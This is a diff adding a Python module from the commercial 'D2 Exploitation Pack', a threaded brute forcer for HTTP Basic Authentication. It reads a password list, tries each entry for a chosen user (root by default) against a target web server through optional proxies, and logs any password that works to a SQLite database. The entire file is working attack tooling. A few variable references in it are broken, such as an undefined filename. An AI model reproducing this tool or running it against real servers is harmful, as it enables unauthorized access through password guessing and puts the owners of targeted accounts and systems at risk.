@@ -1,0 +1,258 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import os
+import getopt
+import sys
+import socket
+import time, datetime
+import struct
+
+sys.path.append('.')
+sys.path.append(os.path.join(os.getcwd(), '3rdparty/D2SEC/libs'))
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from threading import *
+
+from d2sqlite import *
+
+import proto.http
+
+NAME = 'Web Basic Authentication Brute Forcer'
+DESCRIPTION='Threaded Web Basic Authentication Brute Forcer'
+VERSION='0.1'
+
+DOCUMENTATION={}
+DOCUMENTATION['References'] = ''
+DOCUMENTATION['Repeatability'] = 'Infinite'
+DOCUMENTATION["Notes"] = """
+Basic Authentication (401 authentication) Brute Forcer. With full_close
+set to true (default) it will be gracious and slowly close the
+connection. With full_close set to False (or zero), it will run as fast
+as it can, but this causes false negatives.
+
+The folder argument is used to add a folder name at the url.
+
+Ex: python 3rdparty/D2SEC/exploits/d2sec_webauthbf/d2sec_webauthbf.py -t 127.0.0.1 -O passfile:"/tmp/x" -O db_name:/tmp/1.db
+
+Logs can be saved in a SQLite3 database.
+"""
+
+PROPERTY={}
+PROPERTY['TYPE']='Tools'
+PROPERTY['SITE']='Remote'
+PROPERTY['ARCH'] = [ ["Linux"], ["Windows"], ["Solaris"], ["AIX"], ["FreeBSD"], ["MacOSX"], ["HP-UX"] ]
+
+class theexploit(tcpexploit, d2sqlite):
+  def __init__(self):
+    tcpexploit.__init__(self)        
+
+    self.name = NAME
+    self.host = ""
+    self.port = 80
+    self.https = 0
+    self.website = self.host
+    self.cookie = ""
+    self.folder = ""
+    self.useragent = "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)"
+    self.proxy_host = ""
+    self.proxy_port = 0
+    self.mylock = RLock()
+    self.threadcount = 5
+    self.full_close = True 
+    self.connections_failing = False
+    self.found_password = None
+    self.url = "/"
+    self.user = "root"
+    self.db_name = ''
+    self.sql = []
+    self.passfile = ''
+    self.h = None
+    d2sqlite.__init__(self)        
+    return
+
+  def getArgs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port',self.port))
+    self.https = int(self.argsDict.get("https",self.https))
+    self.website = self.argsDict.get("website",self.website)
+    if not self.website:
+      self.website = self.host
+    self.cookie = self.argsDict.get("cookie",self.cookie)
+    self.folder = self.argsDict.get("folder",self.folder)
+    self.user = self.argsDict.get("user",self.user)
+    self.full_close = int(self.argsDict.get("full_close", self.full_close))
+    self.threadcount = int(self.argsDict.get("threadcount", self.threadcount))
+
+    self.proxy_host = self.argsDict.get("hproxy",self.proxy_host)
+    self.proxy_port = self.argsDict.get("pproxy",self.proxy_port)
+
+    self.passfile = self.argsDict.get("passfile",self.passfile)
+    self.db_name = self.argsDict.get("db_name",self.db_name)
+    if self.db_name:
+      try:
+        os.stat(self.db_name)
+      except:
+        self.log("[D2 LOG] %s database not found" % self.db_name)
+        return 1
+
+    return 0
+    
+  def init_http_request(self):
+    if len(self.folder) > 0:
+      self.url += self.folder
+
+    self.h.setparam('Host', self.website)
+    self.h.setparam('Cookie', self.cookie)
+    self.h.setparam('User-agent', self.useragent)
+  
+  def getNextPassword(self):
+    while 1:
+      try:
+        password = self.fd.readline()
+        if password == "":
+          self.no_more_passwords = True
+          break
+        #remove trailing \n
+        password = password.strip()
+        #self.log("New password: %s"%password)
+      except IOError:
+        break
+      yield password
+    return
+    
+  def test_webauth(self):
+    self.h.cnx = self.h.connect()
+    if self.h.cnx == None:
+      return 0
+          
+    resp = self.h.request("GET", self.url)
+
+    self.h.cnx.close()
+
+    if resp.status != 401:
+      self.log('[D2 LOG] Not a site using basic authentication (got a %d)' % resp.status)
+      return 0
+    return 1
+
+  def run_in_thread(self):
+    """
+    Each thread makes connections and tries passwords
+    """
+    password = "A"
+    #six is default so we do one less
+    max_tries_per_connect = 5
+
+    no_more_passwords = False
+    while password != None or self.done == False:
+      if self.state == self.HALT:
+        self.log("[D2 LOG] Thread halting.")
+        return
+
+      if self.done:
+        break
+  
+      self.h.cnx = self.h.connect()
+      if self.cnx == None:
+        return
+
+      for i in xrange(0,max_tries_per_connect):
+        self.mylock.acquire()
+        try:
+          password = self.passwords.next()
+        except StopIteration:
+          no_more_passwords = True
+        self.mylock.release()
+        if no_more_passwords:
+          self.done = True
+          return
+
+        self.log("[D2 LOG] Trying %s:%s" % (self.user, password))
+        self.h.add_auth_basic(self.user, password)
+        
+        resp = self.h.request("GET", self.url)
+        if resp.status == 200 :
+          self.log("[D2 LOG] Found password: %s" % password)
+          self.found_password = password
+          self.done = True
+        if self.full_close:
+          self.h.cnx.close()
+        else:
+          del self.h.cnx
+
+      if self.full_close:
+        self.h.cnx.close()
+      else:
+        del self.h.cnx
+    return
+  
+  def run(self):
+    if self.getArgs():
+      self.setInfo(' %s attacking %s:%d - done (failed)' % (NAME,self.host,self.port))
+      return 0
+
+    self.no_more_passwords = False
+    self.done = False
+
+    self.log('[D2 LOG] %s running against %s:%d' % (NAME,self.host,self.port))
+    self.setInfo('%s attacking %s:%d - running' % (NAME,self.host,self.port))
+
+    self.h = proto.http.apihttp(self.host, self.port)
+    if self.https: self.h.usehttps(https)
+    if self.proxy_host and self.proxy_port != 0: self.h.setproxy(self.proxy_host, self.proxy_port)
+    self.init_http_request()
+
+    i = self.test_webauth()
+    if not i:
+      self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)' % (NAME,self.host,self.port,self.covertness))
+      return i
+
+    self.log('[D2 LOG] Brute forcing user: %s with password file %s' % (self.user, self.filename))
+
+    self.passwords = self.getNextPassword()
+    try:
+      self.fd = file(self.passfile, "rb")
+    except:
+      self.log("[D2 LOG] Can't open %s" % self.passfile)
+      self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)' % (NAME,self.host,self.port,self.covertness))
+      return 0
+
+    if self.full_close:
+      self.log("[D2 LOG] Using slow close method")
+    else:
+      self.log("[D2 LOG] Using fast but less accurate close method")
+
+    self.log("[D2 LOG] Spawning %d threads..." % self.threadcount)
+    for i in xrange(self.threadcount):
+      r = Thread(target=self.run_in_thread)
+      r.start()
+
+    self.log("[D2 LOG] Spawned %d threads" % self.threadcount)
+    while self.done != True:
+      time.sleep(1)
+    self.log("[D2 LOG] Closing open sockets")
+    time.sleep(5)
+    if self.found_password != None:
+      self.log("[D2 LOG] Found working password: %s" % self.found_password)
+      self.setInfo('%s attacking %s:%d (Covertness:%d) - done (found:%s:%s)' % (NAME,self.host,self.port,self.covertness,self.user,self.found_password))
+      if self.db_name:
+        self.db_savelog("%s;d2sec_webauthbf;http://%s (%s/%s);%s" % (self.host, self.website, self.user, self.found_password, str(datetime.datetime.now())))
+      return 1
+    self.log("[D2 LOG] Did not find the password")
+    self.setInfo('%s attacking %s:%d (Covertness:%d) - done (failed)' % (NAME,self.host,self.port,self.covertness))
+    return 0
+
+  def usage(self):
+    print 'Usage: %s -t host -p port -O https:[0|1] -O website:url -O folder:name -O hproxy:host -O pproxy:port -O threadcount:5 -O full_close:0 -O cookie:value -O db_name:<database name> -O user:<username> -O passfile:<filename>' % (sys.argv[0])
+    sys.exit(0)
+
+if __name__=='__main__':
+  app = theexploit()
+  ret = standard_callback_commandline(app)
